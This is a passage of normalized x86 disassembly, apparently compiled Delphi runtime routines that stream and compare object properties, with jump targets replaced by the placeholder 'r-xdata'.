mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0x4 ]
push eax
push sub_41e7c8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov si 0xfffd
call sub_403324
test [ ebx + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] ebx
sub_41efac
mov eax [ ebp - 0x4 ]
call sub_41f278
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f00b
lea eax [ ebp - 0x138 ]
mov edx 0x4
call sub_403edc
retn
mov al [ r-xdata ]
cmp al [ ebp - 0x25 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e828
mov edx [ ebp - 0x10 ]
add edx 0x2
cmp eax edx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41e840
sub_41f028
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x28 ] ecx
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x18 ] esi
mov [ ebx + 0x1c ] esi
mov eax ebx
call sub_4208f4
mov edx esi
mov eax ebx
call sub_41ead4
pop esi
pop ebx
retn
sub_41f050
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x5
mov eax ebx
call sub_420aec
lea edx [ ebp + 0x8 ]
mov ecx 0xa
mov eax ebx
call sub_41e894
pop ebx
pop ebp
retn 0xc
sub_41f074
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0xf
mov eax ebx
call sub_420aec
lea edx [ ebp + 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41e894
pop ebx
pop ebp
retn 0x4
sub_41f098
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x10
mov eax ebx
call sub_420aec
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e894
pop ebx
pop ebp
retn 0x8
sub_41f0bc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x11
mov eax ebx
call sub_420aec
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e894
pop ebx
pop ebp
retn 0x8
sub_41f0e0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx r-xdata
mov eax esi
call sub_407e74
test al al
je r-xdata
mov edx r-xdata
mov eax esi
call sub_407e74
test al al
je r-xdata
mov dl 0x8
mov eax ebx
call sub_420aec
pop esi
pop ebx
retn
mov edx r-xdata
mov eax esi
call sub_407e74
test al al
je r-xdata
mov dl 0x9
mov eax ebx
call sub_420aec
jmp r-xdata
mov edx r-xdata
mov eax esi
call sub_407e74
test al al
je r-xdata
xor edx edx
mov eax ebx
call sub_420aec
jmp r-xdata
pop esi
pop ebx
retn
mov dl 0x7
mov eax ebx
call sub_420aec
mov edx esi
mov eax ebx
call sub_420904
mov dl 0xd
mov eax ebx
call sub_420aec
jmp r-xdata
sub_41f1a4
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_420aec
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41e894
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_420aec
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41e894
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_420aec
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41e894
jmp r-xdata
pop edx
pop ebx
retn
sub_41f218
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov dl 0x13
mov eax ebx
call sub_420aec
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41e894
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ebx
call sub_41f1a4
jmp r-xdata
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_41f280
push ebx
push esi
push ecx
mov esi ecx
mov [ esp ] dl
mov ebx eax
mov al [ r-xdata ]
cmp al [ esp ]
je r-xdata
pop edx
pop esi
pop ebx
retn
mov al [ esp ]
or al 0xf0
mov [ esp + 0x1 ] al
lea edx [ esp + 0x1 ]
mov ecx 0x1
mov eax ebx
call sub_41e894
test [ esp ] 0x2
je r-xdata
mov edx esi
mov eax ebx
call sub_41f1a4
sub_41f2c4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_403368
call sub_414948
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_4026cc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41f371
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_403368
mov edx [ ebp - 0x10 ]
call sub_414b4c
mov esi [ ebp - 0xc ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0xc ]
shl edx 0x2
mov eax [ ebp - 0x10 ]
call sub_4026ec
retn
inc esi
xor edi edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_414ba0
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_420358
mov eax [ ebp - 0x10 ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
sub_41f38c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_403070
mov edx eax
mov eax [ edi ]
call sub_403354
test al al
jne r-xdata
mov al 0x1
sub_41f3bc
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414bd0
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax 0x80000000
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414bd0
cmp ebx eax
sete al
pop ebx
pop ebp
retn
xor eax eax
jmp r-xdata
cmp eax ebx
je r-xdata
pop ebx
pop ebp
retn
mov al 0x1
sub_41f414
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415100
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
sete al
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415100
fld [ ebp - 0x10 ]
fcompp
fnstsw ax
sahf
sete al
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_41f470
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41551c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_41551c
cmp edx [ ebp - 0x4 ]
jne r-xdata
sete al
cmp [ ebp - 0x8 ] 0x0
sete al
jmp r-xdata
cmp eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_41f4c8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41f547
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414f44
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_40473c
sete bl
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414f44
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40473c
sete bl
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f54e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4045dc
retn
sub_41f558
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
pop esi
pop ebx
pop ebp
retn
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407e74
test al al
jne r-xdata
mov al 0x1
sub_41f598
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
sete al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414bd0
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
call sub_41f558
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
sub_41f5f0
push ebp
mov ebp esp
push ecx
push ebx
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414bd0
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
push ebp
call sub_41f598
pop ecx
test al al
jne r-xdata
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
push ebp
call sub_41f598
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
sub_41f670
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41f71c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
sete bl
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f723
lea eax [ ebp - 0x8 ]
call sub_4057b4
lea eax [ ebp - 0x4 ]
call sub_4057b4
retn
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415580
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebp - 0x4 ]
sete bl
test bl bl
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_4057b4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d32c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_41f558
pop ecx
mov ebx eax
sub_41f73c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_41f7f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415580
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_4057b4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d32c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f800
lea eax [ ebp - 0x10 ]
call sub_4057b4
lea eax [ ebp - 0xc ]
call sub_4057b4
lea eax [ ebp - 0x4 ]
call sub_4057b4
retn
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415580
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
call sub_41f670
pop ecx
test al al
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
sub_41f818
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4154a4
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp ebx [ ebp - 0x8 ]
je r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4154a4
mov ebx [ ebp - 0x10 ]
mov al 0x1
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x110 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov eax [ eax ]
mov edx esi
call sub_4033fc
cmp [ ebp - 0x110 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f890
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_41f917
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415424
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_4140cc
mov ebx eax
lea ecx [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415424
lea edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_414140
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f91e
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_40496c
retn
sub_41f928
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_41f38c
mov [ ebp - 0x9 ] al
mov bl 0x1
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
jmp [ eax * 4 + jump_table_41f9ea ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414bd0
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
push ebp
call sub_41f3bc
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f414
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f4c8
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f5f0
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f818
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f890
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f470
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f73c
pop ecx
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414bd0
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41fa90
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41fad8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_40411c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4208a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fadf
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_41fae4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_41fb6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_414948
mov eax [ eax + 0x1 ]
mov edi [ eax ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xb
call sub_420aec
xor ebx ebx
jae r-xdata
bt esi eax
inc ebx
cmp ebx 0x20
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_414954
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_420904
mov eax ebx
cmp eax 0x1f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
call sub_420904
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fb71
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_41fb78
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
xor edx edx
push ebp
push sub_41fbd8
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_417eec
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41f1a4
lea edx [ ebp - 0x4 ]
mov eax esi
call ebx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41f0e0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fbdf
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_41fbe4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41fc7a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
call sub_41fa90
pop ecx
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_403f50
xor eax eax
push ebp
push sub_41fc5d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
call sub_403eb8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41e9e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fc64
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0x4 ]
call sub_403f0c
retn
sub_41fc88
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_41fd3c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414bd0
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_41fa90
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax ]
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov edx ebx
call sub_41fb78
pop ecx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fd43
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e994
jmp r-xdata
dec al
je r-xdata
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
call sub_414954
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f0e0
sub al 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_41fae4
pop ecx
jmp r-xdata
jmp r-xdata
sub_41fd48
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415100
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
push eax
call sub_41fa90
pop ecx
mov ax [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f050
mov esp ebp
pop ebp
retn
sub_41fd88
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_41551c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
push eax
call sub_41fa90
pop ecx
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f218
pop ecx
pop ecx
pop ebp
retn
sub_41fdc4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41fe19
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414f44
mov eax [ ebp + 0x8 ]
push eax
call sub_41fa90
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_420a38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fe20
lea eax [ ebp - 0x4 ]
call sub_4045c4
retn
sub_41fe3c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41ff2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403f0c
jmp r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403f0c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ff32
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_403eb8
mov eax esi
mov ecx r-xdata
mov edx [ ebx + 0x8 ]
call sub_4041c4
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x1c ]
mov eax edi
call sub_41fe24
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_404238
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_41fe3c
pop ecx
push [ ebp - 0x4 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_404238
jmp r-xdata
sub_41ff64
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_420158
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414bd0
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41fa90
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_420aec
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42015f
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403edc
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_403f50
xor eax eax
push ebp
push sub_4200d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
